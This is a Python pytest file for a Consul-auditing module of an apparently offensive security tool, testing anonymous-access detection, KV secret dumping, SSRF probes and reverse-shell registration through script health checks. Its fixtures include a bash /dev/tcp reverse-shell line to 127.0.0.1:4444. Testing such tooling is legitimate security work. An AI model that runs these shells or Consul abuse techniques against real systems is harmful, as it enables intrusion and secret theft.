from __future__ import annotations

import argparse
import base64
import io
import json
import ssl
import urllib.error
from pathlib import Path
from typing import Any

import pytest

from redposture_core import stage_consul as consul
from redposture_core.modules.consul import render as consul_render
from redposture_core.stage_runtime import build_render_plan, render_with_plan
from tests.stage_runtime_helpers import patch_runner_for_legacy_target_fake, run_module_targets_for_test


def test_consul_lab_uses_multiarch_official_image(lab_full_compose_path: Path) -> None:
    compose = lab_full_compose_path.read_text(encoding="utf-8")
    consul_block = compose.split("  consul:", 1)[1].split("  consul-seed:", 1)[0]
    consul_seed_block = compose.split("  consul-seed:", 1)[1].split("  consul-acl:", 1)[0]
    consul_acl_block = compose.split("  consul-acl:", 1)[1].split("  consul-acl-seed:", 1)[0]
    consul_acl_seed_block = compose.split("  consul-acl-seed:", 1)[1].split("  proxmox-mock:", 1)[0]

    assert "image: hashicorp/consul:1.17.3" in consul_block
    assert "image: hashicorp/consul:1.17.3" in consul_acl_block
    assert "dockerfile: docker/consul/Dockerfile" not in consul_block
    assert "dockerfile: docker/consul/Dockerfile" not in consul_acl_block
    assert "redposture-consul-seed-ready" in consul_seed_block
    assert "redposture-consul-acl-seed-ready" in consul_acl_seed_block
    assert '"Script"' not in consul_seed_block
    assert '"Args":["sh","-c","consul members >/dev/null"]' in consul_seed_block
    assert "tail -f /dev/null" in consul_seed_block
    assert "tail -f /dev/null" in consul_acl_seed_block


def _scope_fixture(ok_kv: bool, ok_services: bool, ok_agents: bool) -> dict[str, dict[str, object]]:
    return {
        "kv": {"ok": ok_kv, "count": 1 if ok_kv else 0, "status": 200 if ok_kv else 403, "error": "denied"},
        "services": {
            "ok": ok_services,
            "count": 2 if ok_services else 0,
            "status": 200 if ok_services else 403,
            "error": "denied",
        },
        "agents": {
            "ok": ok_agents,
            "count": 3 if ok_agents else 0,
            "status": 200 if ok_agents else 403,
            "error": "denied",
        },
    }


class _ConsoleCapture:
    instances: list[_ConsoleCapture] = []

    def __init__(self, debug: bool = False) -> None:
        self.debug = debug
        self.messages: list[tuple[str, str]] = []
        type(self).instances.append(self)

    def error(self, message: str) -> None:
        self.messages.append(("error", message))

    def warn(self, message: str) -> None:
        self.messages.append(("warn", message))

    def info(self, message: str) -> None:
        self.messages.append(("info", message))

    def plain(self, message: str, color: str | None = None) -> None:
        _ = color
        self.messages.append(("plain", message))

    def render_tagged_payload_line(self, line: str, tag: str, payload_color: str | None = None) -> bool:
        _ = (line, tag, payload_color)
        return False


def _consul_args(**overrides: object) -> argparse.Namespace:
    data: dict[str, object] = {
        "debug": False,
        "timeout": 1.0,
        "retries": 0,
        "ports": None,
        "port": 8500,
        "targets": "127.0.0.1",
        "hosts": None,
        "hosts_file": None,
        "token": None,
        "username": None,
        "password": None,
        "ssrf_target": None,
        "ssrf_port": None,
        "ssrf_path": None,
        "show_keys": False,
        "kv_key": None,
        "dump": False,
        "show_services": False,
        "show_agents": False,
        "show_checks": False,
        "show_nodes": False,
        "service_dump_name": None,
        "agent_name": None,
        "node_name": None,
        "revshell": False,
        "delete_revshell": False,
        "revshell_listen": False,
        "revshell_host": None,
        "revshell_port": None,
        "revshell_payload": None,
        "revshell_check_id": None,
        "output": None,
        "output_format": "txt",
        "workers": 1,
    }
    data.update(overrides)
    return argparse.Namespace(**data)


def test_scope_status_helpers() -> None:
    all_ok = _scope_fixture(True, True, True)
    none_ok = _scope_fixture(False, False, False)

    assert consul._all_scopes_ok(all_ok) is True
    assert consul._no_scopes_ok(all_ok) is False
    assert consul._all_scopes_ok(none_ok) is False
    assert consul._no_scopes_ok(none_ok) is True


def test_scope_suffix_helpers() -> None:
    scopes = _scope_fixture(True, False, True)
    counts = consul._scope_counts_suffix(scopes)
    bools = consul._scope_bools_suffix(scopes)
    assert "(kv:1)" in counts and "(services:0)" in counts and "(agents:3)" in counts
    assert "(kv:True)" in bools and "(services:False)" in bools and "(agents:True)" in bools


def test_scope_detail_lines_contains_errors_for_failed_scopes() -> None:
    scopes = _scope_fixture(True, False, False)
    lines = consul._scope_status_detail_lines("CONSUL\t127.0.0.1\t8500\t", scopes)
    assert len(lines) == 2
    assert all("err=denied" in line for line in lines)


def test_anonymous_acl_denied_with_filtered_empty() -> None:
    scopes_zero = {
        "kv": {"ok": False, "count": 0},
        "services": {"ok": False, "count": 0},
        "agents": {"ok": False, "count": 0},
    }
    record = {"anonymous_self_ok": False, "anonymous_self_error": "permission denied"}
    assert consul._anonymous_acl_denied_with_filtered_empty(record, scopes_zero) is True


def test_normalize_ssrf_helpers() -> None:
    assert consul._normalize_ssrf_path("/v1/agent/self?x=1") == ("/v1/agent/self", "x=1")
    urls = consul._normalize_ssrf_urls("127.0.0.1", "8500,8501", "/v1/status/leader")
    assert urls == [
        "http://127.0.0.1:8500/v1/status/leader",
        "http://127.0.0.1:8501/v1/status/leader",
    ]


def test_normalize_ssrf_urls_accepts_16_cidr_targets() -> None:
    urls = consul._normalize_ssrf_urls("10.153.0.0/16", "8500", "/v1/status/leader")
    assert len(urls) == 65534
    assert urls[0] == "http://10.153.0.1:8500/v1/status/leader"
    assert urls[-1] == "http://10.153.255.254:8500/v1/status/leader"


def test_normalize_ssrf_urls_rejects_oversized_cidr_targets() -> None:
    assert consul._normalize_ssrf_urls("10.152.0.0/15", "8500", "/v1/status/leader") == []


def test_detect_line_for_fail_not_consul_and_detected() -> None:
    fail = consul._detect_line(
        {"host": "127.0.0.1", "port": 8500, "is_consul": False, "status": "fail", "error": "timeout"}, "txt"
    )
    assert "[!] connection failed err=timeout" in fail

    not_consul = consul._detect_line(
        {"host": "127.0.0.1", "port": 8500, "is_consul": False, "status": "not_consul"}, "txt"
    )
    assert "[-] not a Consul API" in not_consul

    detected = consul._detect_line(
        {
            "host": "127.0.0.1",
            "port": 8500,
            "is_consul": True,
            "version": "1.20.0",
            "anonymous_scopes": _scope_fixture(True, True, True),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
        },
        "txt",
    )
    assert "[*] Consul Agent" in detected
    assert "(auth required:False)" in detected


def test_summary_line_for_anonymous_access_and_partial() -> None:
    full = consul._summary_line(
        {
            "is_consul": True,
            "anonymous_scopes": _scope_fixture(True, True, True),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
            "rce": False,
        }
    )
    assert full is not None and full.startswith("[+] anonymous access")

    partial = consul._summary_line(
        {
            "is_consul": True,
            "anonymous_scopes": _scope_fixture(True, False, False),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
        }
    )
    assert partial is not None and partial.startswith("[!] anonymous partial access")


def test_auth_summary_line_token_valid_and_failed() -> None:
    ok_line = consul._auth_summary_line(
        {
            "auth_mode": "token",
            "auth_valid": True,
            "auth_scopes": _scope_fixture(True, True, False),
            "rce": False,
        }
    )
    assert ok_line is not None and ok_line.startswith("[+] token auth")

    fail_line = consul._auth_summary_line(
        {
            "auth_mode": "basic",
            "_username_display": "admin",
            "_password_display": "bad",
            "auth_valid": False,
            "auth_error": "denied",
            "auth_scopes": _scope_fixture(False, False, False),
        }
    )
    assert fail_line is not None and fail_line.startswith("[-] admin:bad failed")
    assert "err=denied" in fail_line


def test_bool_text() -> None:
    assert consul._bool_text(True) == "True"
    assert consul._bool_text(False) == "False"
    assert consul._bool_text(None) == "unknown"


def test_consul_helper_decoders_and_flags() -> None:
    assert consul._friendly_error_text("<urlopen error certificate verify failed>") == (
        "tls verification failed (try --insecure or trusted cert)"
    )
    assert consul._friendly_error_text("[Errno 61] Connection refused") == (
        "connection refused (service is not listening on target port)"
    )
    assert consul._friendly_error_from_exception(urllib.error.URLError(TimeoutError("timed out"))) == (
        "connection timeout"
    )
    assert consul._is_tls_verify_error_text("self signed certificate") is True
    assert consul._consul_headers("tok", "alice", "secret")["X-Consul-Token"] == "tok"
    assert consul._consul_headers(None, "alice", "secret")["Authorization"].startswith("Basic ")
    assert consul._parse_consul_leader(b'"127.0.0.1:8300"') == "127.0.0.1:8300"
    assert consul._looks_like_consul_payload(200, b'"127.0.0.1:8300"') is True
    assert consul._count_kv_keys(["a", "b"]) == 2
    assert consul._count_services({"svc": [], "svc2": []}) == 2
    assert consul._count_agents([{"a": 1}, {"b": 2}]) == 2
    assert consul._count_health_checks([{"id": 1}]) == 1
    payload = {
        "Config": {"Version": "1.17.3"},
        "Nested": {"EnableLocalScriptChecks": "true", "x": [{"EnableRemoteScriptChecks": False}]},
    }
    assert consul._extract_consul_version(payload) == "1.17.3"
    assert consul._find_bool_recursive(payload, "EnableLocalScriptChecks") is True
    assert consul._extract_script_check_flags(payload) == (True, False)


def test_request_with_tls_fallback_probe_and_put_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    responses = iter(
        [
            (0, b"", {}, "tls verification failed (try --insecure or trusted cert)"),
            (200, b'{"ok":true}', {}, None),
        ]
    )
    monkeypatch.setattr(consul, "_http_request", lambda *args, **kwargs: next(responses))
    status, payload, headers, error, effective_insecure, tls_auto = consul._request_with_tls_fallback(
        "127.0.0.1",
        8500,
        "GET",
        "/v1/status/leader",
        1.0,
        use_https=True,
        insecure=False,
    )
    assert status == 200
    assert payload == b'{"ok":true}'
    assert headers == {}
    assert error is None
    assert effective_insecure is True
    assert tls_auto is True

    probe_responses = iter(
        [
            (404, b"missing", {}, None, False, False),
            (403, b'"permission denied"', {}, None, False, False),
        ]
    )
    monkeypatch.setattr(consul, "_request_with_tls_fallback", lambda *args, **kwargs: next(probe_responses))
    assert consul._probe_consul_scheme("127.0.0.1", 8500, 1.0) == (True, "https", False, False, None, None)

    monkeypatch.setattr(
        consul,
        "_request_with_tls_fallback",
        lambda *args, **kwargs: (200, b'{"status":"ok"}', {}, None, False, False),
    )
    status, payload, error = consul._consul_put_json(
        "127.0.0.1",
        8500,
        "/v1/agent/service/register",
        1.0,
        {"Name": "web"},
        scheme="http",
        insecure=False,
    )
    assert (status, payload, error) == (200, {"status": "ok"}, None)

    monkeypatch.setattr(
        consul,
        "_request_with_tls_fallback",
        lambda *args, **kwargs: (500, b"boom", {}, None, False, False),
    )
    assert consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/agent/check/deregister/rev-rp-1",
        1.0,
        scheme="http",
        insecure=False,
    ) == (500, "boom")


def test_consul_catalog_services_and_kv_value_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):
        _ = (args, kwargs)
        return 200, {"web": ["public"], "db": ["primary", "rw"]}, None, False, False

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)
    items, error = consul._consul_catalog_services_list(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert error is None
    assert items == [
        {"name": "db", "tags": ["primary", "rw"]},
        {"name": "web", "tags": ["public"]},
    ]

    assert consul._normalize_inline_text("a   b\n c") == "a b c"
    raw = base64.b64encode(b"secret value\n").decode("ascii")
    assert consul._decode_consul_kv_value(raw) == "secret value"
    assert consul._decode_consul_kv_value(123) == "123"


def test_consul_list_helpers_error_and_nested_payload_branches(monkeypatch: pytest.MonkeyPatch) -> None:
    checks = consul._consul_agent_checks_list(
        {
            "bad": "not-dict",
            "check-a": {
                "Name": "web",
                "Status": "passing",
                "ServiceID": "web-1",
                "Definition": {
                    "Args": ["sh", "-c", "echo ok"],
                    "HTTP": "http://web/health",
                    "EnterpriseMeta": {"Namespace": "edge"},
                },
                "EnterpriseMeta": {"Partition": "payments"},
            },
            "check-b": {
                "Name": "tcp",
                "Status": "critical",
                "Definition": {"TCP": "db:5432", "Interval": "10s", "Timeout": "2s"},
                "Output": "connection refused",
            },
        }
    )
    assert len(checks) == 2
    assert checks[0]["script"] == "<from args> sh -c 'echo ok'"
    assert checks[0]["http"] == "http://web/health"
    assert checks[0]["namespace"] == "edge"
    assert checks[0]["partition"] == "payments"
    assert checks[1]["tcp"] == "db:5432"
    assert checks[1]["output"] == "connection refused"

    responses = iter(
        [
            (403, {}, None, False, False),
            (200, ["not-a-map"], None, False, False),
            (200, {"": ["skip"], "api": ["v1", ""]}, None, False, False),
            (401, [], None, False, False),
            (200, "bad", None, False, False),
            (
                200,
                [{"Name": "", "Tags": {}}, {"Name": "node-a", "Addr": "10.0.0.1", "Tags": {"role": "server"}}],
                None,
                False,
                False,
            ),
            (500, [], None, False, False),
            (200, "bad", None, False, False),
            (
                200,
                [{"Node": "", "Address": ""}, {"Node": "node-a", "Address": "10.0.0.1", "Datacenter": "dc1"}],
                None,
                False,
                False,
            ),
        ]
    )
    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: next(responses))

    assert consul._consul_catalog_services_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "Forbidden",
    )
    assert consul._consul_catalog_services_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "invalid services response",
    )
    services, error = consul._consul_catalog_services_list("h", 8500, 1.0, scheme="http", insecure=False)
    assert error is None
    assert services == [{"name": "api", "tags": ["v1"]}]
    assert consul._consul_agent_members_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "Unauthorized",
    )
    assert consul._consul_agent_members_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "invalid agent members response",
    )
    agents, error = consul._consul_agent_members_list("h", 8500, 1.0, scheme="http", insecure=False)
    assert error is None
    assert agents == [
        {"name": "node-a", "addr": "10.0.0.1", "port": None, "status": None, "role": "server", "dc": None}
    ]
    assert consul._consul_catalog_nodes_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "status=500",
    )
    assert consul._consul_catalog_nodes_list("h", 8500, 1.0, scheme="http", insecure=False) == (
        None,
        "invalid catalog nodes response",
    )
    nodes, error = consul._consul_catalog_nodes_list("h", 8500, 1.0, scheme="http", insecure=False)
    assert error is None
    assert nodes == [{"name": "node-a", "address": "10.0.0.1", "datacenter": "dc1"}]


def test_detail_lines_cover_transport_kv_and_services() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "scheme": "http",
        "tls_auto_insecure": True,
        "local_script_checks": True,
        "remote_script_checks": True,
        "rce": True,
        "anonymous_scopes": _scope_fixture(True, False, False),
        "auth_scopes": _scope_fixture(False, True, False),
        "dump_requested": True,
        "dump_all_requested": True,
        "kv_dump_items": [{"key": "secret/app", "value": "topsecret"}],
        "services_list_requested": True,
        "services_list": [{"name": "web"}],
        "service_instances": {
            "web": [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {
                            "check_id": "service:web-1",
                            "name": "web",
                            "status": "passing",
                            "http": "http://10.0.0.20:8080/health",
                            "interval": "10s",
                            "notes": "healthy service",
                            "output": "HTTP 200 OK",
                        }
                    ],
                }
            ]
        },
        "service_instances_errors": {},
    }
    lines = consul._detail_lines(record, "txt", debug=True)
    joined = "\n".join(lines)
    assert "Transport (scheme:http) (tls_auto_insecure:True)" in joined
    assert "RCE! (EnableLocalScriptChecks:True) (EnableRemoteScriptChecks:True)" in joined
    assert "[*] KV Dump" in joined
    assert "secret/app=topsecret" in joined
    assert "[*] Services" in joined
    assert "meta.team=sre" in joined
    assert "args=--dump" in joined
    assert "check_id=service:web-1" in joined
    assert "output=HTTP 200 OK" in joined


def test_consul_generic_render_plan_includes_summary_and_detail_lines() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "version": "1.17.3",
        "scheme": "http",
        "anonymous_scopes": _scope_fixture(True, True, False),
        "auth_mode": "token",
        "auth_valid": True,
        "auth_scopes": _scope_fixture(True, False, False),
        "dump_requested": True,
        "dump_all_requested": True,
        "kv_dump_items": [{"key": "secret/app", "value": "topsecret"}],
        "services_list_requested": True,
        "services_list": [{"name": "web"}],
    }

    plan = build_render_plan(consul_render)
    lines = render_with_plan(plan, record, "txt", debug=True)
    joined = "\n".join(lines)

    assert any(func.__name__ == "_format_consul_detail_lines" for func, _takes_debug in plan.details)
    assert "Consul Agent" in joined
    assert "anonymous partial access" in joined
    assert "token auth" in joined
    assert "[*] KV Dump" in joined
    assert "secret/app=topsecret" in joined
    assert "[*] Services" in joined
    assert consul_render._format_consul_detail_lines(record, "json", debug=True) == []


def test_audit_consul_targets_json_output_is_machine_readable(monkeypatch, tmp_path) -> None:
    def fake_audit_consul_host(*args, **kwargs):
        _ = (args, kwargs)
        return {
            "timestamp": "2026-03-26T18:01:07Z",
            "host": "127.0.0.1",
            "port": 8500,
            "is_consul": True,
            "status": "ok",
            "scheme": "http",
            "version": "1.17.3",
            "anonymous_scopes": _scope_fixture(True, False, False),
            "anonymous_self_ok": True,
            "anonymous_self_error": None,
            "auth_mode": None,
            "auth_valid": None,
            "auth_scopes": {},
            "rce": False,
            "error": None,
        }

    monkeypatch.setattr(consul, "_audit_consul_host", fake_audit_consul_host)
    output_path = tmp_path / "consul.json"

    total, detected, failed, revshell_registered = run_module_targets_for_test(
        "consul",
        hosts=["127.0.0.1"],
        port=8500,
        timeout=1.0,
        retries=0,
        workers=1,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        output_path=str(output_path),
        output_format="json",
    )

    assert (total, detected, failed, revshell_registered) == (1, 1, 0, False)
    lines = output_path.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 1
    assert json.loads(lines[0])["is_consul"] is True


def test_audit_consul_host_full_auth_flow_with_actions_and_revshell(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (True, "https", True, True, "127.0.0.1:8300", None),
    )

    def fake_access_matrix(*_args, headers=None, **_kwargs):
        return _scope_fixture(False, False, False) if headers is None else _scope_fixture(True, True, True)

    def fake_self_probe(*_args, headers=None, **_kwargs):
        if headers is None:
            return {"ok": False, "error": "permission denied"}
        return {
            "ok": True,
            "version": "1.17.3",
            "local_script_checks": True,
            "remote_script_checks": True,
            "error": None,
        }

    monkeypatch.setattr(consul, "_consul_access_matrix", fake_access_matrix)
    monkeypatch.setattr(consul, "_agent_self_probe", fake_self_probe)
    monkeypatch.setattr(consul, "_consul_kv_keys_list", lambda *_args, **_kwargs: (["secret/app"], None))
    monkeypatch.setattr(
        consul,
        "_consul_kv_dump",
        lambda *_args, **_kwargs: ([{"key": "secret/app", "value": "topsecret"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_catalog_services_list",
        lambda *_args, **_kwargs: ([{"name": "web"}, {"name": "db"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_get_checks",
        lambda *_args, **_kwargs: (
            200,
            {
                "service:web-1": {
                    "CheckID": "service:web-1",
                    "Name": "web",
                    "Status": "passing",
                    "ServiceID": "web-1",
                    "HTTP": "http://10.0.0.20:8080/health",
                }
            },
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_health_service_instances",
        lambda *_args, **_kwargs: (
            [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {
                            "check_id": "service:web-1",
                            "name": "web",
                            "status": "passing",
                            "http": "http://10.0.0.20:8080/health",
                            "output": "HTTP 200 OK",
                        }
                    ],
                }
            ],
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_agent_members_list",
        lambda *_args, **_kwargs: (
            [{"name": "node-1", "addr": "10.0.0.10", "dc": "dc1", "role": "server", "port": 8301, "status": "alive"}],
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_catalog_nodes_list",
        lambda *_args, **_kwargs: ([{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_service_action",
        lambda *_args, **_kwargs: {"name": "redposture", "action": "create", "ok": True, "args": "--dump"},
    )
    monkeypatch.setattr(
        consul,
        "_consul_ssrf_probe",
        lambda *_args, target_url, **_kwargs: {
            "target_url": target_url,
            "registered": True,
            "status": "passing",
            "output": "HTTP 200 OK",
            "deregistered": True,
        },
    )
    monkeypatch.setattr(
        consul,
        "_consul_script_revshell",
        lambda *_args, **_kwargs: {
            "action": "create",
            "listener": "127.0.0.1:4444",
            "script": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "registered": True,
            "check_id": "rp-revshell",
            "wait_seconds": 1.5,
            "auto_cleanup": True,
            "deregistered": True,
        },
    )

    record = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token="root-token",
        username=None,
        password=None,
        do_ssrf=True,
        ssrf_urls=["http://127.0.0.1:9100/metrics"],
        show_keys=True,
        kv_key=None,
        dump_requested=True,
        dump_all_requested=True,
        show_services=True,
        show_agents=True,
        show_checks=True,
        check_dump_id="service:web-1",
        show_nodes=True,
        service_name="redposture",
        service_dump_name="web",
        agent_dump_name="node-1",
        node_dump_name="node-1",
        delete_service=False,
        service_args="--dump",
        revshell_enabled=True,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host="127.0.0.1",
        revshell_port=4444,
        revshell_payload=None,
        revshell_check_id="rp-revshell",
    )

    assert record["status"] == "valid_credentials"
    assert record["auth_mode"] == "token"
    assert record["auth_valid"] is True
    assert record["version"] == "1.17.3"
    assert record["rce"] is True
    assert record["service_result"]["ok"] is True
    assert record["ssrf_results"][0]["registered"] is True
    assert record["script_revshell"]["registered"] is True


def test_audit_consul_host_debug_stage_telemetry(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (True, "http", False, False, "127.0.0.1:8300", None),
    )
    monkeypatch.setattr(consul, "_consul_access_matrix", lambda *_args, **_kwargs: _scope_fixture(True, True, True))
    monkeypatch.setattr(
        consul,
        "_agent_self_probe",
        lambda *_args, **_kwargs: {
            "ok": True,
            "error": None,
            "version": "1.17.3",
            "local_script_checks": True,
            "remote_script_checks": True,
        },
    )
    monkeypatch.setattr(
        consul,
        "_audit_consul_host_core",
        lambda *_args, **_kwargs: {
            "timestamp": "2026-04-10T00:00:00Z",
            "host": "127.0.0.1",
            "port": 8500,
            "is_consul": True,
            "status": "open_no_auth",
            "scheme": "http",
            "insecure_effective": False,
            "tls_auto_insecure": False,
            "leader": "127.0.0.1:8300",
            "version": "1.17.3",
            "anonymous_scopes": _scope_fixture(True, True, True),
            "auth_mode": None,
            "auth_valid": None,
            "auth_scopes": {},
            "auth_error": None,
            "anonymous_self_ok": True,
            "anonymous_self_error": None,
            "local_script_checks": True,
            "remote_script_checks": True,
            "rce": True,
            "ssrf_enabled": False,
            "ssrf_results": [],
            "script_revshell": None,
            "keys_requested": False,
            "kv_key_requested": None,
            "dump_requested": False,
            "dump_all_requested": False,
            "kv_keys_list": None,
            "kv_keys_error": None,
            "kv_dump_items": None,
            "kv_dump_error": None,
            "services_list_requested": False,
            "service_dump_name": None,
            "services_list_source": None,
            "services_list": None,
            "services_list_error": None,
            "service_instances": None,
            "service_instances_errors": None,
            "agents_list_requested": False,
            "agent_dump_name": None,
            "agents_list_source": None,
            "agents_list": None,
            "agents_list_error": None,
            "checks_list_requested": False,
            "check_dump_id": None,
            "checks_list_source": None,
            "checks_list": None,
            "checks_list_error": None,
            "nodes_list_requested": False,
            "node_dump_name": None,
            "nodes_list_source": None,
            "nodes_list": None,
            "nodes_list_error": None,
            "service_result": None,
            "service_args": None,
            "error": None,
            "elapsed_ms": 2,
            "auth_required": False,
        },
    )

    record = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        debug=True,
    )

    assert record["status"] == "open_no_auth"
    stage_names = [str(item.get("stage_name") or "") for item in record.get("stages") or [] if isinstance(item, dict)]
    assert "detect_protocol" in stage_names
    assert "auth_inference_credentials" in stage_names
    assert "access_capabilities" in stage_names
    assert "data" in stage_names
    assert any("stage_timing_summary" in str(item) for item in (record.get("debug_events") or []))


def test_audit_consul_targets_two_pass_gate_and_debug_markers(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_call(*_args, run_deep_checks: bool, **_kwargs):
        host = str(_args[0])
        base = {
            "timestamp": "2026-04-10T00:00:00Z",
            "host": host,
            "port": 8500,
            "is_consul": True,
            "scheme": "http",
            "insecure_effective": False,
            "tls_auto_insecure": False,
            "leader": "127.0.0.1:8300",
            "version": "1.17.3",
            "auth_mode": None,
            "auth_valid": None,
            "auth_scopes": {},
            "auth_error": None,
            "anonymous_self_ok": True,
            "anonymous_self_error": None,
            "local_script_checks": True,
            "remote_script_checks": True,
            "rce": True,
            "ssrf_enabled": False,
            "ssrf_results": [],
            "script_revshell": None,
            "keys_requested": False,
            "kv_key_requested": None,
            "dump_requested": False,
            "dump_all_requested": False,
            "service_result": None,
            "service_args": None,
            "error": None,
            "elapsed_ms": 1,
            "stages": [],
            "stage_failed_at": None,
            "stage_durations_ms": {},
            "stage_attempts": {},
            "debug_events": [],
            "debug_events_streamed": False,
        }
        if not run_deep_checks:
            if host == "10.0.0.1":
                return {
                    **base,
                    "status": "open_no_auth",
                    "auth_required": False,
                    "anonymous_scopes": _scope_fixture(True, True, True),
                }
            return {
                **base,
                "status": "auth_required",
                "auth_required": True,
                "anonymous_scopes": _scope_fixture(False, False, False),
            }
        return {
            **base,
            "status": "open_no_auth",
            "auth_required": False,
            "anonymous_scopes": _scope_fixture(True, True, True),
        }

    monkeypatch.setattr(consul, "_call_audit_consul_host_with_thread_debug", fake_call)

    emitted: list[str] = []
    debug_lines: list[str] = []
    totals = run_module_targets_for_test(
        "consul",
        hosts=["10.0.0.1", "10.0.0.2"],
        port=8500,
        timeout=1.0,
        retries=0,
        workers=2,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        output_path=None,
        output_format="txt",
        emit_line=emitted.append,
        logger=None,
        debug_emit=debug_lines.append,
    )

    assert totals == (2, 2, 0, False)
    assert any("pass=1 detect start total=2" in line for line in debug_lines)
    assert any("pass=2 deep start total=1" in line for line in debug_lines)
    assert any("10.0.0.1:8500 stage2_gate=run reason=status=open_no_auth" in line for line in debug_lines)
    assert any("10.0.0.2:8500 stage2_gate=skip reason=status=auth_required" in line for line in debug_lines)


def test_audit_consul_host_not_consul_and_fail_record(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (False, None, False, False, None, "connection timeout"),
    )
    record = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
    )
    assert record["status"] == "fail"
    assert record["error"] == "connection timeout"

    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("connection refused")),
    )
    monkeypatch.setattr(consul, "_retry_delay", lambda _attempt: 0.0)
    failed = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        1,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
    )
    assert failed["status"] == "fail"
    assert "connection refused" in str(failed["error"])


def test_detail_lines_cover_checks_nodes_ssrf_and_revshell() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
